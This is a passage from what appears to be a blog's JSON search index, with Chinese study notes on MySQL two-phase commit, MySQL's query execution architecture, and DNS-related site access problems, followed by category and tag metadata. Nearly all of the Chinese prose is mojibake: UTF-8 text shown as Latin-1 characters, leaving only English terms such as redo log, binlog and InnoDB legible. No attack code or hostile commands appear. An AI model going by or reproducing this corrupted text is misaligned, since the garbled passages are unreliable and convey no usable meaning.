æ‰§è¡Œå™¨æ‹¿åˆ°å¼•æ“ç»™çš„è¡Œæ•°æ®ï¼ŒæŠŠè¿™ä¸ªå€¼åŠ ä¸Š 1ï¼Œæ¯”å¦‚åŸæ¥æ˜¯ Nï¼Œç°åœ¨å°±æ˜¯ N+1ï¼Œå¾—åˆ°æ–° çš„ä¸€è¡Œæ•°æ®ï¼Œå†è°ƒç”¨å¼•æ“æ¥å£å†™å…¥è¿™è¡Œæ–°æ•°æ®ã€‚ å¼•æ“å°†è¿™è¡Œæ–°æ•°æ®æ›´æ–°åˆ°å†…å­˜ä¸­ï¼ŒåŒæ—¶å°†è¿™ä¸ªæ›´æ–°æ“ä½œè®°å½•åˆ° redo log é‡Œé¢ï¼Œæ­¤æ—¶ redo log å¤„äº prepare çŠ¶æ€ã€‚ç„¶åå‘ŠçŸ¥æ‰§è¡Œå™¨æ‰§è¡Œå®Œæˆäº†ï¼Œéšæ—¶å¯ä»¥æäº¤äº‹åŠ¡ã€‚ æ‰§è¡Œå™¨ç”Ÿæˆè¿™ä¸ªæ“ä½œçš„ binlogï¼Œå¹¶æŠŠ binlog å†™å…¥ç£ç›˜ã€‚ æ‰§è¡Œå™¨è°ƒç”¨å¼•æ“çš„æäº¤äº‹åŠ¡æ¥å£ï¼Œå¼•æ“æŠŠåˆšåˆšå†™å…¥çš„ redo log æ”¹æˆæäº¤(commit)çŠ¶æ€ï¼Œæ›´æ–°å®Œæˆã€‚ ä¸‹é¢è¿™ä¸ªå›¾æ˜¯ Update è¯­å¥æ‰§è¡Œæµç¨‹å›¾ï¼Œå›¾ä¸­æµ…è‰²æ¡†è¡¨ç¤ºåœ¨ InnoDb å†…éƒ¨æ‰§è¡Œçš„ï¼Œæ·±è‰²æ¡†è¡¨ç¤ºæ˜¯åœ¨æ‰§è¡Œå™¨ä¸­æ‰§è¡Œçš„ã€‚ ä½ å¯èƒ½æ³¨æ„åˆ°äº†ï¼Œæœ€åä¸‰æ­¥çœ‹ä¸Šå»æœ‰ç‚¹â€œç»•â€ï¼Œå°† redo log çš„å†™å…¥æ‹†æˆäº†ä¸¤ä¸ªæ­¥éª¤: prepare å’Œ commitï¼Œè¿™å°±æ˜¯â€ä¸¤é˜¶æ®µæäº¤â€ã€‚ ä¸¤é˜¶æ®µæäº¤ä¸¤é˜¶æ®µæäº¤çš„æäº¤çš„ç›®çš„æ˜¯ä¸ºäº†ä¿è¯ redo log å’Œ binlog ä¸¤ä¸ªçŠ¶æ€åœ¨é€»è¾‘ä¸Šä¸€è‡´ï¼Œè¦ä¹ˆéƒ½æˆåŠŸï¼Œè¦ä¹ˆéƒ½ä¸æˆåŠŸã€‚ ç”±äº redo log å’Œ binlog æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„é€»è¾‘ï¼Œå¦‚æœä¸ç”¨ä¸¤é˜¶æ®µæäº¤ï¼Œè¦ä¹ˆå°±æ˜¯å…ˆå†™å®Œ redo log å†å†™ binlogï¼Œæˆ–è€…é‡‡ç”¨åè¿‡æ¥çš„é¡ºåºã€‚æˆ‘ä»¬çœ‹çœ‹è¿™ä¸¤ç§æ–¹å¼ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ã€‚ ä»ç„¶ç”¨å‰é¢çš„ update è¯­å¥æ¥åšä¾‹å­ã€‚å‡è®¾å½“å‰ ID=2 çš„è¡Œï¼Œå­—æ®µ c çš„å€¼æ˜¯ 0ï¼Œå†å‡è®¾æ‰§è¡Œ update è¯­å¥è¿‡ç¨‹ä¸­åœ¨å†™å®Œç¬¬ä¸€ä¸ªæ—¥å¿—åï¼Œç¬¬äºŒä¸ªæ—¥å¿—è¿˜æ²¡æœ‰å†™å®ŒæœŸé—´å‘ç”Ÿäº† crashï¼Œä¼šå‡º ç°ä»€ä¹ˆæƒ…å†µå‘¢? å…ˆå†™ redo log åå†™ binlogã€‚å‡è®¾åœ¨ redo log å†™å®Œï¼Œbinlog è¿˜æ²¡æœ‰å†™å®Œçš„æ—¶å€™ï¼Œ MySQL è¿›ç¨‹å¼‚å¸¸é‡å¯ã€‚ç”±äºæˆ‘ä»¬å‰é¢è¯´è¿‡çš„ï¼Œredo log å†™å®Œä¹‹åï¼Œç³»ç»Ÿå³ä½¿å´©æºƒï¼Œä» ç„¶èƒ½å¤ŸæŠŠæ•°æ®æ¢å¤å›æ¥ï¼Œæ‰€ä»¥æ¢å¤åè¿™ä¸€è¡Œ c çš„å€¼æ˜¯ 1ã€‚ä½†æ˜¯ç”±äº binlog æ²¡å†™å®Œå°± crash äº†ï¼Œè¿™æ—¶å€™ binlog é‡Œé¢å°±æ²¡æœ‰è®°å½•è¿™ä¸ªè¯­å¥ã€‚å› æ­¤ï¼Œ ä¹‹åå¤‡ä»½æ—¥å¿—çš„æ—¶å€™ï¼Œå­˜èµ·æ¥çš„ binlog é‡Œé¢å°±æ²¡æœ‰è¿™æ¡è¯­å¥ã€‚ ç„¶åä½ ä¼šå‘ç°ï¼Œå¦‚æœéœ€è¦ç”¨è¿™ä¸ª binlog æ¥æ¢å¤ä¸´æ—¶åº“çš„è¯ï¼Œç”±äºè¿™ä¸ªè¯­å¥çš„ binlog ä¸¢ å¤±ï¼Œè¿™ä¸ªä¸´æ—¶åº“å°±ä¼šå°‘äº†è¿™ä¸€æ¬¡æ›´æ–°ï¼Œæ¢å¤å‡ºæ¥çš„è¿™ä¸€è¡Œ c çš„å€¼å°±æ˜¯ 0ï¼Œä¸åŸåº“çš„å€¼ä¸ åŒã€‚ å…ˆå†™ binlog åå†™ redo logã€‚å¦‚æœåœ¨ binlog å†™å®Œä¹‹å crashï¼Œç”±äº redo log è¿˜æ²¡å†™ï¼Œ å´©æºƒæ¢å¤ä»¥åè¿™ä¸ªäº‹åŠ¡æ— æ•ˆï¼Œæ‰€ä»¥è¿™ä¸€è¡Œ c çš„å€¼æ˜¯ 0ã€‚ä½†æ˜¯ binlog é‡Œé¢å·²ç»è®°å½•äº†â€œæŠŠ c ä» 0 æ”¹æˆ 1â€è¿™ä¸ªæ—¥å¿—ã€‚æ‰€ä»¥ï¼Œåœ¨ä¹‹åç”¨ binlog æ¥æ¢å¤çš„æ—¶å€™å°±å¤šäº†ä¸€ä¸ªäº‹åŠ¡å‡ºæ¥ï¼Œ æ¢å¤å‡ºæ¥çš„è¿™ä¸€è¡Œ c çš„å€¼å°±æ˜¯ 1ï¼Œä¸åŸåº“çš„å€¼ä¸åŒã€‚ å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœä¸ä½¿ç”¨â€œä¸¤é˜¶æ®µæäº¤â€ï¼Œé‚£ä¹ˆæ•°æ®åº“çš„çŠ¶æ€å°±æœ‰å¯èƒ½å’Œç”¨å®ƒçš„æ—¥å¿—æ¢å¤å‡ºæ¥ çš„åº“çš„çŠ¶æ€ä¸ä¸€è‡´ã€‚ redo log å’Œ binlog éƒ½å¯ä»¥ç”¨äºè¡¨ç¤ºäº‹åŠ¡çš„æäº¤çŠ¶æ€ï¼Œè€Œä¸¤é˜¶æ®µæäº¤å°±æ˜¯è®©è¿™ä¸¤ ä¸ªçŠ¶æ€ä¿æŒé€»è¾‘ä¸Šçš„ä¸€è‡´ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"01 Mysql åŸºç¡€æ¶æ„ï¼šä¸€æ¡ SQL æŸ¥è¯¢è¯­å¥æ˜¯å¦‚ä½•æ‰§è¡Œçš„","slug":"mysql-infrastructure-how-a-sql-query-statement-is-executed","date":"2022-05-22T09:02:49.000Z","updated":"2022-05-24T02:20:27.784Z","comments":true,"path":"mysql-infrastructure-how-a-sql-query-statement-is-executed/","link":"","permalink":"https://www.0x2beace.com/mysql-infrastructure-how-a-sql-query-statement-is-executed/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ äº†è§£ Mysql åŸºç¡€æ¶æ„æ˜¯æ€æ ·çš„ è¾“å…¥ä¸€æ¡ select è¯­å¥ï¼Œè¿”å›ä¸€ä¸ªç»“æœï¼Œåœ¨ Mysql å†…éƒ¨ä¸­æ‰§è¡Œäº†æ€æ ·çš„è¿‡ç¨‹ è¿æ¥å™¨ã€æŸ¥è¯¢ç¼“å­˜ã€åˆ†æå™¨ã€æ‰§è¡Œå™¨è¿™äº›ç»„ä»¶çš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆ åŸºç¡€æ¶æ„MySQL çš„é€»è¾‘æ¶æ„å›¾ï¼š å¤§ä½“æ¥è¯´ï¼ŒMySQL å¯ä»¥åˆ†ä¸º Server å±‚å’Œå­˜å‚¨å¼•æ“å±‚ä¸¤éƒ¨åˆ†ã€‚ ä¸åŒçš„å­˜å‚¨å¼•æ“å…±ç”¨ä¸€ä¸ªServer å±‚ï¼ŒServer å±‚åŒ…æ‹¬è¿æ¥å™¨ã€æŸ¥è¯¢ç¼“å­˜ã€åˆ†æå™¨ã€ä¼˜åŒ–å™¨ã€æ‰§è¡Œå™¨ç­‰ï¼Œæ¶µç›– MySQL çš„å¤§å¤šæ•°æ ¸ å¿ƒæœåŠ¡åŠŸèƒ½ï¼Œä»¥åŠæ‰€æœ‰çš„å†…ç½®å‡½æ•°(å¦‚æ—¥æœŸã€æ—¶é—´ã€æ•°å­¦å’ŒåŠ å¯†å‡½æ•°ç­‰)ï¼Œæ‰€æœ‰è·¨å­˜å‚¨å¼•æ“ çš„åŠŸèƒ½éƒ½åœ¨è¿™ä¸€å±‚å®ç°ï¼Œæ¯”å¦‚å­˜å‚¨è¿‡ç¨‹ã€è§¦å‘å™¨ã€è§†å›¾ç­‰ã€‚ è€Œå­˜å‚¨å¼•æ“å±‚è´Ÿè´£æ•°æ®çš„å­˜å‚¨å’Œæå–ã€‚å…¶æ¶æ„æ¨¡å¼æ˜¯æ’ä»¶å¼çš„ï¼Œæ”¯æŒ InnoDBã€MyISAMã€Memory ç­‰å¤šä¸ªå­˜å‚¨å¼•æ“ã€‚ç°åœ¨æœ€å¸¸ç”¨çš„å­˜å‚¨å¼•æ“æ˜¯ InnoDBï¼Œå®ƒä» MySQL 5.5.5 ç‰ˆæœ¬å¼€ å§‹æˆä¸ºäº†é»˜è®¤å­˜å‚¨å¼•æ“ã€‚ æ‰§è¡Œè¿‡ç¨‹æ‰§è¡Œä¸€æ¡ select åˆ†ä¸ºäº”ä¸ªæ­¥éª¤ï¼š å®¢æˆ·ç«¯å‘é€ä¸€æ¡ select æŸ¥è¯¢ç»™æœåŠ¡å™¨ æœåŠ¡å™¨å…ˆæ£€æŸ¥æŸ¥è¯¢ç¼“å­˜ï¼Œå¦‚æœå‘½ä¸­ç¼“å­˜ï¼Œåˆ™ç«‹å³è¿”å›å­˜å‚¨åœ¨ç¼“å­˜ä¸­çš„ç»“æœï¼Œå¦åˆ™è¿›å…¥ä¸‹ä¸€é˜¶æ®µ æœåŠ¡å™¨è¿›è¡Œè¯æ³•åˆ†æã€è¯­æ³•åˆ†æï¼Œå†ç”±æŸ¥è¯¢ä¼˜åŒ–å™¨ç”Ÿæˆå¯¹åº”çš„æ‰§è¡Œè®¡åˆ’ Mysql æ ¹æ®æ‰§è¡Œè®¡åˆ’è°ƒç”¨å­˜å‚¨å¼•æ“ API æ‰§è¡ŒæŸ¥è¯¢ å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼ŒåŒæ—¶ä¹Ÿä¼šæ”¾å…¥æŸ¥è¯¢ç¼“å­˜ä¸­ ç»„ä»¶è¿æ¥å™¨è¿æ¥å™¨è´Ÿè´£è·Ÿå®¢æˆ·ç«¯å»ºç«‹è¿æ¥ã€è·å–æƒé™ã€ç»´æŒå’Œç®¡ç†è¿æ¥ã€‚ è¿æ¥å‘½ä»¤ï¼š 1mysql -h$ip -P$post -u$user -p è¿æ¥å‘½ä»¤ä¸­çš„ mysql æ˜¯å®¢æˆ·ç«¯å·¥å…·ï¼Œç”¨æ¥è·ŸæœåŠ¡ç«¯å»ºç«‹è¿æ¥ã€‚åœ¨å®Œæˆç»å…¸çš„ TCP æ¡æ‰‹åï¼Œ è¿æ¥å™¨å°±è¦å¼€å§‹è®¤è¯ä½ çš„èº«ä»½ï¼Œè¿™ä¸ªæ—¶å€™ç”¨çš„å°±æ˜¯ä½ è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ å¦‚æœç”¨æˆ·åæˆ–å¯†ç ä¸å¯¹ï¼Œä½ å°±ä¼šæ”¶åˆ°ä¸€ä¸ªâ€Access denied for userâ€çš„é”™è¯¯ï¼Œç„¶åå®¢æˆ·ç«¯ ç¨‹åºç»“æŸæ‰§è¡Œã€‚ å¦‚æœç”¨æˆ·åå¯†ç è®¤è¯é€šè¿‡ï¼Œè¿æ¥å™¨ä¼šåˆ°æƒé™è¡¨é‡Œé¢æŸ¥å‡ºä½ æ‹¥æœ‰çš„æƒé™ã€‚ä¹‹åï¼Œè¿™ä¸ªè¿æ¥é‡Œ é¢çš„æƒé™åˆ¤æ–­é€»è¾‘ï¼Œéƒ½å°†ä¾èµ–äºæ­¤æ—¶è¯»åˆ°çš„æƒé™ã€‚ è¿æ¥å®Œæˆåï¼Œå¦‚æœä½ æ²¡æœ‰åç»­çš„åŠ¨ä½œï¼Œè¿™ä¸ªè¿æ¥å°±å¤„äºç©ºé—²çŠ¶æ€ï¼Œä½ å¯ä»¥åœ¨ show processlist å‘½ä»¤ä¸­çœ‹åˆ°å®ƒã€‚ æ–‡æœ¬ä¸­è¿™ä¸ªå›¾æ˜¯ show processlist çš„ç»“æœï¼Œå…¶ä¸­çš„ Command åˆ—æ˜¾ç¤ºä¸ºâ€œSleepâ€çš„è¿™ä¸€è¡Œï¼Œå°±è¡¨ç¤ºç°åœ¨ç³»ç»Ÿé‡Œé¢æœ‰ä¸€ä¸ªç©ºé—²è¿æ¥ã€‚ æ•°æ®åº“é‡Œé¢ï¼Œé•¿è¿æ¥æ˜¯æŒ‡è¿æ¥æˆåŠŸåï¼Œå¦‚æœå®¢æˆ·ç«¯æŒç»­æœ‰è¯·æ±‚ï¼Œåˆ™ä¸€ç›´ä½¿ç”¨åŒä¸€ä¸ªè¿æ¥ã€‚çŸ­ è¿æ¥åˆ™æ˜¯æŒ‡æ¯æ¬¡æ‰§è¡Œå®Œå¾ˆå°‘çš„å‡ æ¬¡æŸ¥è¯¢å°±æ–­å¼€è¿æ¥ï¼Œä¸‹æ¬¡æŸ¥è¯¢å†é‡æ–°å»ºç«‹ä¸€ä¸ªã€‚ æŸ¥è¯¢ç¼“å­˜MySQL æ‹¿åˆ°ä¸€ä¸ªæŸ¥è¯¢è¯·æ±‚åï¼Œä¼šå…ˆåˆ°æŸ¥è¯¢ç¼“å­˜çœ‹çœ‹ï¼Œä¹‹å‰æ˜¯ä¸æ˜¯æ‰§è¡Œè¿‡è¿™æ¡è¯­å¥ã€‚ä¹‹å‰æ‰§ è¡Œè¿‡çš„è¯­å¥åŠå…¶ç»“æœå¯èƒ½ä¼šä»¥ key-value å¯¹çš„å½¢å¼ï¼Œè¢«ç›´æ¥ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚key æ˜¯æŸ¥è¯¢çš„ è¯­å¥ï¼Œvalue æ˜¯æŸ¥è¯¢çš„ç»“æœã€‚å¦‚æœä½ çš„æŸ¥è¯¢èƒ½å¤Ÿç›´æ¥åœ¨è¿™ä¸ªç¼“å­˜ä¸­æ‰¾åˆ° keyï¼Œé‚£ä¹ˆè¿™ä¸ª value å°±ä¼šè¢«ç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ å¦‚æœè¯­å¥ä¸åœ¨æŸ¥è¯¢ç¼“å­˜ä¸­ï¼Œå°±ä¼šç»§ç»­åé¢çš„æ‰§è¡Œé˜¶æ®µã€‚æ‰§è¡Œå®Œæˆåï¼Œæ‰§è¡Œç»“æœä¼šè¢«å­˜å…¥æŸ¥è¯¢ ç¼“å­˜ä¸­ã€‚ä½ å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæŸ¥è¯¢å‘½ä¸­ç¼“å­˜ï¼ŒMySQL ä¸éœ€è¦æ‰§è¡Œåé¢çš„å¤æ‚æ“ä½œï¼Œå°±å¯ä»¥ç›´ æ¥è¿”å›ç»“æœï¼Œè¿™ä¸ªæ•ˆç‡ä¼šå¾ˆé«˜ã€‚ ä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä¸ä¼šå»ºè®®ä½¿ç”¨æŸ¥è¯¢ç¼“å­˜ï¼Œè¿™æ˜¯å› ä¸ºæŸ¥è¯¢ç¼“å­˜å¾€å¾€å¼Šå¤§äºåˆ©â€”â€”æŸ¥è¯¢ç¼“å­˜çš„å¤±æ•ˆéå¸¸é¢‘ç¹ï¼Œåªè¦æœ‰å¯¹ä¸€ä¸ªè¡¨çš„æ›´æ–°ï¼Œè¿™ä¸ªè¡¨ä¸Šæ‰€æœ‰çš„æŸ¥è¯¢ç¼“å­˜éƒ½ä¼šè¢«æ¸…ç©ºã€‚ åˆ†æå™¨å¦‚æœæ²¡æœ‰å‘½ä¸­æŸ¥è¯¢ç¼“å­˜ï¼Œå°±è¦å¼€å§‹çœŸæ­£æ‰§è¡Œè¯­å¥äº†ã€‚ åˆ†æå™¨å…ˆä¼šåšâ€œè¯æ³•åˆ†æâ€ã€‚ä½ è¾“å…¥çš„æ˜¯ç”±å¤šä¸ªå­—ç¬¦ä¸²å’Œç©ºæ ¼ç»„æˆçš„ä¸€æ¡ SQL è¯­å¥ï¼ŒMySQL éœ€è¦è¯†åˆ«å‡ºé‡Œé¢çš„å­—ç¬¦ä¸²åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Œä»£è¡¨ä»€ä¹ˆã€‚ â€œè¯­æ³•åˆ†æâ€åˆ™æ˜¯ï¼Œæ ¹æ®è¯­æ³•è§„åˆ™ï¼Œåˆ¤æ–­ä½ è¾“å…¥çš„è¿™ä¸ª SQL è¯­å¥æ˜¯å¦æ»¡è¶³ MySQL è¯­æ³•ã€‚ å¦‚æœä½ çš„è¯­å¥ä¸å¯¹ï¼Œå°±ä¼šæ”¶åˆ°â€œYou have an error in your SQL syntaxâ€œ çš„é”™è¯¯æé†’ã€‚ ä¼˜åŒ–å™¨ç»è¿‡äº†åˆ†æå™¨ï¼ŒMySQL å°±çŸ¥é“ä½ è¦åšä»€ä¹ˆäº†ã€‚åœ¨å¼€å§‹æ‰§è¡Œä¹‹å‰ï¼Œè¿˜è¦å…ˆç»è¿‡ä¼˜åŒ–å™¨çš„å¤„ç†ã€‚ ä¼˜åŒ–å™¨æ˜¯åœ¨è¡¨é‡Œé¢æœ‰å¤šä¸ªç´¢å¼•çš„æ—¶å€™ï¼Œå†³å®šä½¿ç”¨å“ªä¸ªç´¢å¼•;æˆ–è€…åœ¨ä¸€ä¸ªè¯­å¥æœ‰å¤šè¡¨å…³è” (join)çš„æ—¶å€™ï¼Œå†³å®šå„ä¸ªè¡¨çš„è¿æ¥é¡ºåºã€‚ ä¼˜åŒ–å™¨é˜¶æ®µå®Œæˆåï¼Œè¿™ä¸ªè¯­å¥çš„æ‰§è¡Œæ–¹æ¡ˆå°±ç¡®å®šä¸‹æ¥äº†ï¼Œç„¶åè¿›å…¥æ‰§è¡Œå™¨é˜¶æ®µã€‚ æ‰§è¡Œå™¨å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ï¼Œè¦å…ˆåˆ¤æ–­ä¸€ä¸‹ä½ å¯¹è¿™ä¸ªè¡¨ T æœ‰æ²¡æœ‰æ‰§è¡ŒæŸ¥è¯¢çš„æƒé™ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±ä¼šè¿” å›æ²¡æœ‰æƒé™çš„é”™è¯¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123mysql&gt; select * from T where ID &#x3D; 10;ERROR 1142 (42000): SELECT command denied to user &#39;b&#39;@&#39;localhost&#39; for table &#39;T&#39; å¦‚æœæœ‰æƒé™ï¼Œå°±æ‰“å¼€è¡¨ç»§ç»­æ‰§è¡Œã€‚æ‰“å¼€è¡¨çš„æ—¶å€™ï¼Œæ‰§è¡Œå™¨å°±ä¼šæ ¹æ®è¡¨çš„å¼•æ“å®šä¹‰ï¼Œå»ä½¿ç”¨è¿™ ä¸ªå¼•æ“æä¾›çš„æ¥å£ã€‚ æ¯”å¦‚æˆ‘ä»¬è¿™ä¸ªä¾‹å­ä¸­çš„è¡¨ T ä¸­ï¼ŒID å­—æ®µæ²¡æœ‰ç´¢å¼•ï¼Œé‚£ä¹ˆæ‰§è¡Œå™¨çš„æ‰§è¡Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š è°ƒç”¨ InnoDB å¼•æ“æ¥å£å–è¿™ä¸ªè¡¨çš„ç¬¬ä¸€è¡Œï¼Œåˆ¤æ–­ ID å€¼æ˜¯ä¸æ˜¯ 10ï¼Œå¦‚æœä¸æ˜¯åˆ™è·³è¿‡ï¼Œå¦‚ æœæ˜¯åˆ™å°†è¿™è¡Œå­˜åœ¨ç»“æœé›†ä¸­; è°ƒç”¨å¼•æ“æ¥å£å–â€œä¸‹ä¸€è¡Œâ€ï¼Œé‡å¤ç›¸åŒçš„åˆ¤æ–­é€»è¾‘ï¼Œç›´åˆ°å–åˆ°è¿™ä¸ªè¡¨çš„æœ€åä¸€è¡Œã€‚ æ‰§è¡Œå™¨å°†ä¸Šè¿°éå†è¿‡ç¨‹ä¸­æ‰€æœ‰æ»¡è¶³æ¡ä»¶çš„è¡Œç»„æˆçš„è®°å½•é›†ä½œä¸ºç»“æœé›†è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ è‡³æ­¤ï¼Œè¿™ä¸ªè¯­å¥å°±æ‰§è¡Œå®Œæˆäº†ã€‚ å¯¹äºæœ‰ç´¢å¼•çš„è¡¨ï¼Œæ‰§è¡Œçš„é€»è¾‘ä¹Ÿå·®ä¸å¤šã€‚ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ˜¯â€œå–æ»¡è¶³æ¡ä»¶çš„ç¬¬ä¸€è¡Œâ€è¿™ä¸ªæ¥ å£ï¼Œä¹‹åå¾ªç¯å–â€œæ»¡è¶³æ¡ä»¶çš„ä¸‹ä¸€è¡Œâ€è¿™ä¸ªæ¥å£ï¼Œè¿™äº›æ¥å£éƒ½æ˜¯å¼•æ“ä¸­å·²ç»å®šä¹‰å¥½çš„ã€‚ ä½ ä¼šåœ¨æ•°æ®åº“çš„æ…¢æŸ¥è¯¢æ—¥å¿—ä¸­çœ‹åˆ°ä¸€ä¸ª rows_examined çš„å­—æ®µï¼Œè¡¨ç¤ºè¿™ä¸ªè¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸­ æ‰«æäº†å¤šå°‘è¡Œã€‚è¿™ä¸ªå€¼å°±æ˜¯åœ¨æ‰§è¡Œå™¨æ¯æ¬¡è°ƒç”¨å¼•æ“è·å–æ•°æ®è¡Œçš„æ—¶å€™ç´¯åŠ çš„ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"ä¸ºä»€ä¹ˆåŸŸåè§£ææˆåŠŸï¼Œç½‘ç«™ä»æ— æ³•è®¿é—®","slug":"successful-domain-name-analysis-domain-name-lawless-question","date":"2022-05-22T08:42:08.000Z","updated":"2022-05-24T02:20:27.785Z","comments":true,"path":"successful-domain-name-analysis-domain-name-lawless-question/","link":"","permalink":"https://www.0x2beace.com/successful-domain-name-analysis-domain-name-lawless-question/","excerpt":"æœ€è¿‘æ€»æ˜¯æ”¶åˆ°åé¦ˆï¼Œå“ªä¸ªç«™ç‚¹åˆåŒå’å•æ‰“ä¸å¼€äº†ã€‚æˆ‘æ‰¾åˆ°å¯¹åº”çš„ç«™ç‚¹ï¼ŒæŒ‰ä¸‹å›è½¦ï¼Œå´åˆå¯ä»¥æ­£å¸¸è®¿é—®ã€‚","text":"æœ€è¿‘æ€»æ˜¯æ”¶åˆ°åé¦ˆï¼Œå“ªä¸ªç«™ç‚¹åˆåŒå’å•æ‰“ä¸å¼€äº†ã€‚æˆ‘æ‰¾åˆ°å¯¹åº”çš„ç«™ç‚¹ï¼ŒæŒ‰ä¸‹å›è½¦ï¼Œå´åˆå¯ä»¥æ­£å¸¸è®¿é—®ã€‚ è¿™ç¯‡æ–‡ç« å°±æ¥æ•´ç†ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆåŒä¸€ä¸ªç½‘ç«™ï¼Œæœ‰äº›åœ°æ–¹å¯ä»¥è®¿é—®ï¼Œæœ‰ä¸€äº›åœ°æ–¹åˆæ— æ³•è®¿é—®ã€‚ ä¸€æ¬¡å®Œæ•´çš„è¯·æ±‚åœ¨å›ç­”ä¸Šé¢çš„é—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å®Œæ•´çš„ç½‘ç»œè¯·æ±‚å¤§æ¦‚éœ€è¦ç»å†å“ªäº›è¿‡ç¨‹ã€‚ æˆåŠŸè®¿é—®ç½‘ç«™åŒ…å«ä»¥ä¸‹ä¸¤ä¸ªé˜¶æ®µï¼Œè¿™ä¸¤ä¸ªé˜¶æ®µç¼ºä¸€ä¸å¯ï¼Œéœ€è¦åŒæ—¶æˆåŠŸæ‰èƒ½æ­£å¸¸è®¿é—®ç½‘ç«™ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é˜¶æ®µä¸€DNSæ ¹æ®è®¿é—®è¯·æ±‚ä¸­çš„åŸŸåè§£æå‡ºå¯¹åº”çš„IPåœ°å€å¹¶è¿”å›è§£æç»“æœã€‚ åœ¨æ­¤é˜¶æ®µï¼Œå‡ºç°å¦‚ä¸‹æƒ…å†µå°†å¯¼è‡´ç½‘ç«™æ— æ³•è®¿é—®ï¼š åŸŸåè§£æä¸æˆåŠŸï¼šæ— æ³•è¿”å›è§£æç»“æœï¼Œå¯å‚è€ƒåŸŸåè§£æä¸ç”Ÿæ•ˆæœ‰å“ªäº›åŸå› ï¼Ÿè¿›è¡Œå¤„ç†ã€‚ åŸŸåæœªè¿›è¡Œå®åè®¤è¯ï¼šæ‰¾åˆ°å¯¹åº”çš„æœåŠ¡å•†è¿›è¡Œè®¤è¯ é˜¶æ®µäºŒè®¿é—®ç½‘ç«™æœåŠ¡å™¨IPè·å–ç½‘ç«™å†…å®¹ã€‚ åœ¨æ­¤é˜¶æ®µï¼Œå‡ºç°å¦‚ä¸‹æƒ…å†µï¼Œå³ä½¿DNSæˆåŠŸè§£æåŸŸåçš„IPåœ°å€ï¼Œç½‘ç«™ä»ç„¶æ— æ³•è®¿é—®ï¼š ç½‘ç«™æœåŠ¡å™¨ä¸å¯ç”¨ï¼šæœåŠ¡å™¨ä¸ç”¨å¯çš„åŸå› å°±å¾ˆå¤šäº†ï¼Œæ­¤å¤„å°±ä¸è¯¦ç»†å±•å¼€äº† ç½‘ç«™æœåŠ¡å™¨åŸŸååŠIPåœ°å€æœªå¤‡æ¡ˆ æ€»ç»“è¯´äº†è¿™ä¹ˆå¤šï¼Œä¸ºä»€ä¹ˆæˆ‘å¯ä»¥è®¿é—®ï¼Ÿè€Œä»–ä»¬è®¿é—®ä¸äº†ï¼Ÿ æˆ‘èƒ½æ­£å¸¸è®¿é—®ï¼Œä»–ä»¬åˆ‡æ¢æˆæ•°æ®ä¹Ÿèƒ½æ­£å¸¸è®¿é—®ï¼Œè¶³ä»¥è¯´æ˜ç½‘ç«™æ˜¯æ­£å¸¸çš„ã€‚ ä»–ä»¬ä½¿ç”¨ WIFI è®¿é—®ä¸äº†ï¼Œå¾ˆå¯èƒ½å°±æ˜¯ DNS æ²¡æœ‰æ­£å¸¸è§£æå‡ºæ¥å¯¹åº”çš„IPåœ°å€ã€‚è€Œè§£æä¸æˆåŠŸçš„åŸå› å°±æœ‰å¾ˆå¤šäº†ï¼š æœ¬åœ°ç½‘ç»œæ•…éšœï¼ˆä»–ä»¬å¯ä»¥è®¿é—®å…¶ä»–ç½‘ç«™ï¼Œæ‰€ä»¥å¯ä»¥æ’é™¤ï¼‰ äº‘è§£ææœåŠ¡å™¨çš„è§£æè®°å½•å¼‚å¸¸ï¼ˆæˆ‘èƒ½æ­£å¸¸è®¿é—®ï¼Œæ‰€ä»¥ä¹Ÿæ’é™¤ï¼‰ åŸŸåæœªé€šè¿‡å®åè®¤è¯ï¼ˆåŸŸåèƒ½æŸ¥åˆ°å¤‡æ¡ˆè®°å½•ï¼Œæ‰€ä»¥ä¹Ÿæ’é™¤ï¼‰ 